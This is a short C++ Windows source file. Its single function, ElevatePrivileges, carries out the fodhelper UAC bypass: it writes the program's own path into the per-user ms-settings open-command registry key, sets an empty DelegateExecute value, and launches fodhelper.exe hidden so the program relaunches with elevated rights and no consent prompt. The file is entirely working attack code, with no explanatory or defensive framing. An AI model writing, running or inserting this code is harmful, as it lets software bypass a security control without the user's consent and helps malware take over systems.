#include <windows.h>
#include <string>
#include "../../include/utils/crypto.h"

#pragma comment(lib, "advapi32.lib")

bool ElevatePrivileges() {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);

    HKEY hKey;
    const char* registryPath = "Software\\Classes\\ms-settings\\Shell\\Open\\command";

    if (RegCreateKeyExA(HKEY_CURRENT_USER, registryPath, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        
        RegSetValueExA(hKey, NULL, 0, REG_SZ, (BYTE*)path, strlen(path));
        
        RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ, (BYTE*)"", 1);
        
        RegCloseKey(hKey);

        ShellExecuteA(NULL, "open", "fodhelper.exe", NULL, NULL, SW_HIDE);

        return true;
    }
    return false;
}